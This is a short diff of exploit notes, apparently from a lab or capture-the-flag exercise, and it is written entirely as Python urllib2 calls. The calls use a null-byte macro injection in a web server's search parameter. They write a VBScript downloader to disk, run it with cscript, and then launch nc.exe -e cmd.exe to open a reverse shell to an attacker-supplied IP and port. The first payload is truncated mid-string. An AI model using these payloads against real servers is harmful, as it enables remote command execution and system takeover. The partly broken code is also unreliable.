@@ -1,0 +1,8 @@
+1/ script_create()
+urllib2.urlopen("http://10.10.10.5:8080/?search=%00{.+save|C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.S .}")
+
+2/ script_exec()
+urllib2.urlopen("http://10.10.10.5:8080/?search=%00{.+exec|cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs}
+
+3/ nc_run()
+urllib2.urlopen("http://10.10.10.5:8080/?search=%00{.+exec|C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port}
